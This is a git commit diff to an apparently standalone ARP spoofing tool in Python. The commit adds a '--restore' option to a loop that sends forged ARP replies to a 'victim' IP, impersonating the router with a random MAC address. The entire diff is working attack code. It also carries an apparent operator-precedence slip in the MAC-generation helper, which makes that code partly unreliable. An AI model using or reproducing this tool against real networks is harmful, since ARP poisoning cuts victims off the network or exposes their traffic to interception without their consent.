660bbe09ea2aa7bb492de2d200d7edc6a1b1e1a1
GodSaveTheDoge <51802433+GodSaveTheDoge@users.noreply.github.com>
2021-01-27 18:52:12 +0100

    Added --restore

--- main.py
+++ main.py
@@ -18,34 +18,46 @@ def entry_point(
     mac_addr: Optional[str] = typer.Option(
         "", help="The mac address to send to the victim", show_default="random"
     ),
+    restore: bool = typer.Option(
+        False, help="Send the real mac address before quitting"
+    ),
 ):
-    # I'll leave checking if the ip is valid
-    # as an exercise to the reader
+    # I'll leave checking if the ip is valid as an exercise to the reader
+    if restore:
+        r_hwsrc = send_arp_request(router_ip)
     pkcnt = 0
-    for i in itertools.cycle("|/-\\"):
-        send_arp_response(victim_ip, router_ip, mac_addr)
-        pkcnt += 1
-        typer.echo(
-            "\r"
-            + typer.style(i, fg="red")
-            + typer.style(" [", fg="yellow", bold=True)
-            + typer.style(str(pkcnt), fg="yellow")
-            + typer.style("]", fg="yellow", bold=True),
-            nl=False,
-        )
-        time.sleep(delay)
+    try:
+        for i in itertools.cycle(r"\|/-"):
+            send_arp_response(victim_ip, router_ip, mac_addr)
+            pkcnt += 1
+            typer.echo(
+                "\r"
+                + typer.style(i, fg="red")
+                + typer.style(" [", fg="yellow", bold=True)
+                + typer.style(str(pkcnt), fg="yellow")
+                + typer.style("]", fg="yellow", bold=True),
+                nl=False,
+            )
+            time.sleep(delay)
+    finally:
+        if restore:
+            send_arp_response(victim_ip, router_ip, r_hwsrc)
 
 
-def get_mac_address(unicast: bool = False, universal: bool = False) -> str:
-    lb = (not unicast) + ((not universal) << 1)
+def get_mac_address(unicast: bool = True, universal: bool = True) -> str:
+    lb = (not unicast) + (not universal << 1)
     foct = lb + (random.randint(0, 63) << 2)
     octs = [foct] + [random.randrange(255) for _ in range(5)]
     return ":".join(f"{i:X}" for i in octs)
 
 
+def send_arp_request(pdst: str) -> str:
+    return scapy.all.sr1(scapy.layers.l2.ARP(op=1, pdst=pdst), verbose=False).hwsrc
+
+
 def send_arp_response(dst_ip: str, src_ip: str, hwsrc: Optional[str] = None) -> None:
     if not hwsrc:
-        hwsrc = get_mac_address()
+        hwsrc = get_mac_address(unicast=False)
     scapy.all.send(
         scapy.layers.l2.ARP(op=2, psrc=src_ip, pdst=dst_ip, hwsrc=hwsrc), verbose=False
     )
